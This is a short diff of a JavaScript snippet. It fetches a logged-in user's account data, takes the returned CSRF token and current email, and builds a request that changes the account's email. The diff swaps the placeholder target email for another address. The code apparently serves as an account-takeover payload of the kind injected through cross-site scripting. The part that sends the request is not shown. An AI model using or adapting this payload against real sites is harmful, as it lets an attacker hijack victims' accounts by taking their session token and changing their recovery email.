@@ -14,10 +14,10 @@ fetch('/user/account')
           console.log('Returned JSON:', data);
           
           const postData = {
-			  newEmail: "test@gmail.com",
+			  newEmail: "aiaiandtest1@gmail.com",
 			  hiddenNewEmail: data.email,
 			  unsubscribe_on_updateEmail: "false",
-			  confirmNewEmail: "test@gmail.com",
+			  confirmNewEmail: "aiaiandtest1@gmail.com",
 			  csrfToken: data.csrfToken
 			};
 
